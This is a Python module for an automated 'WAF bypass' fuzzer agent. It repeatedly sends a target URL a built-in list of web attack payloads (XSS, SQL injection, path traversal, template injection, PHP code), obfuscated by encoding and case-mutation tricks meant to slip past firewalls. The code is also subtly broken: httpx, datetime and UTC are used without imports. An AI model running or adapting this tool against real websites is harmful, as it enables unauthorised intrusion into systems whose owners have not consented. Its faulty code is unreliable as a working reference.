from __future__ import annotations

import asyncio
import logging
import os
import random
import re
from typing import Any, Dict, List, Optional

# Assuming necessary imports for K1 architecture
# from apps.backend.src.core.trilium.client import TriliumClient
# from apps.backend.src.core.trilium.query import OrchestrationQueryLayer
# from apps.backend.src.core.trilium.session_manager import SessionManager
# from apps.backend.src.core.governance.governor import Governor

logger = logging.getLogger(__name__)

class RalphFuzzerAgent:
    """
    K1's Ralph Wiggum Secondary Fuzzer (Stage 15).
    Deploys 'naive persistence' to bypass WAFs through payload mutation.
    """

    # Payloads will come from Stage 16 Pre-Processor (to be implemented).
    # For now, a simple list of common fuzzing strings.
    DEFAULT_WORDLIST = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "%00", # NUL byte
        "%27%27", # Double single quote
        "UNION SELECT NULL,NULL,NULL--",
        "../../../../etc/passwd",
        "{{7*7}}", # SSTI
        "<?php phpinfo(); ?>",
        "admin'--",
    ]

    # Simple mutation techniques
    MUTATORS = [
        lambda s: s.replace(" ", "%20"), # URL encode spaces
        lambda s: s.replace("'", "%27"), # URL encode single quotes
        lambda s: s.replace(">", "%3E"), # URL encode >
        lambda s: s.replace("<", "%3C"), # URL encode <
        lambda s: s.replace("/", "%2F"), # URL encode /
        lambda s: s.replace("=", "%3D"), # URL encode =
        lambda s: s.replace("--", "%2d%2d"), # URL encode --
        lambda s: f"/*{random.randint(0,9999)}*/{s}", # Add comments
        lambda s: s.upper(),
        lambda s: s.lower(),
        lambda s: s.replace("script", "sCriPt"), # Case mutation
        lambda s: s.replace("alert", "aLeRt"),
        lambda s: s.replace("select", "sElEcT"),
        lambda s: s.replace("union", "uNiOn"),
        lambda s: f"data:text/html,{s}", # Data URI
        lambda s: s.encode('utf-16be').hex(), # UTF-16be hex encoding
    ]

    # Success token to break the loop
    SUCCESS_TOKEN = "<promise>SUCCESS</promise>" # This would be an expected response body/header.

    def __init__(
        self,
        target_url: str,
        wordlist_source: Optional[str] = None,
        tool_name: str = "ralph_fuzzer",
        agent_id: str = "ralph_instance",
        # K1 component integration for later
        # trilium_client: TriliumClient,
        # query_layer: OrchestrationQueryLayer,
        # session_manager: SessionManager,
        # governor: Governor,
    ):
        self.target_url = target_url
        self.tool_name = tool_name
        self.agent_id = agent_id
        self.wordlist = self._load_wordlist(wordlist_source)
        self.fuzzing_task: Optional[asyncio.Task] = None
        self._running = False
        self.progress_file = f"/tmp/ralph_progress_{agent_id}.txt" # For basic persistence
        self.http_client = httpx.AsyncClient() # For sending requests

    def _load_wordlist(self, source: Optional[str]) -> List[str]:
        """Loads wordlist from a file or uses default."""
        if source and os.path.exists(source):
            with open(source, "r") as f:
                return [line.strip() for line in f if line.strip()]
        return self.DEFAULT_WORDLIST

    async def start_fuzzing(self):
        """Starts the main fuzzing loop."""
        if not self._running:
            self._running = True
            self.fuzzing_task = asyncio.create_task(self._fuzz_loop())
            logger.info(f"{self.tool_name}: Starting fuzzing for {self.target_url}")

    async def _fuzz_loop(self):
        """The core Ralph loop: mutate, send, check, repeat."""
        mutated_payloads_attempted = 0
        while self._running:
            original_payload = random.choice(self.wordlist)
            mutated_payload = original_payload
            for _ in range(random.randint(1, 3)): # Apply 1-3 mutations
                mutator = random.choice(self.MUTATORS)
                mutated_payload = mutator(mutated_payload)
            
            mutated_payloads_attempted += 1
            logger.debug(f"{self.tool_name}: Fuzzing with payload (attempt {mutated_payloads_attempted}): {mutated_payload[:50]}...")
            
            try:
                # Assuming target_url has a parameter to inject into
                test_url = f"{self.target_url}?param={mutated_payload}"
                response = await self.http_client.get(test_url, timeout=10)
                
                if self.SUCCESS_TOKEN in response.text:
                    logger.info(f"{self.tool_name}: SUCCESS! WAF Bypassed with payload: {mutated_payload}")
                    self._record_progress(f"SUCCESS: {mutated_payload}")
                    # In a real K1, this would update Trilium, trigger StateHandoffSystem, etc.
                    self._running = False # Stop on success for this instance
                    break
                else:
                    logger.debug(f"{self.tool_name}: Payload failed. Status: {response.status_code}")
                    self._record_progress(f"FAIL: {mutated_payload}")
            
            except httpx.RequestError as e:
                logger.error(f"{self.tool_name}: HTTP Request failed: {str(e)}")
                self._record_progress(f"ERROR: {str(e)}")
            
            await asyncio.sleep(random.uniform(1, 3)) # Random delay
        
        logger.info(f"{self.tool_name}: Fuzzing loop finished.")

    def _record_progress(self, message: str):
        """Records progress to a local file for persistence across reboots."""
        with open(self.progress_file, "a") as f:
            f.write(f"{datetime.now(UTC).isoformat()} - {message}\n")

    async def stop_fuzzing(self):
        """Stops the fuzzing loop."""
        self._running = False
        if self.fuzzing_task:
            self.fuzzing_task.cancel()
            try:
                await self.fuzzing_task
            except asyncio.CancelledError:
                pass
        await self.http_client.aclose()
        logger.info(f"{self.tool_name}: Fuzzer stopped.")


# Example usage (for local testing, not part of K1 orchestrator)
async def main():
    target = "http://example.com/search" # Replace with a real target
    ralph = RalphFuzzerAgent(target_url=target)
    await ralph.start_fuzzing()
    await asyncio.sleep(60) # Run for 60 seconds
    await ralph.stop_fuzzing()

if __name__ == "__main__":
    asyncio.run(main())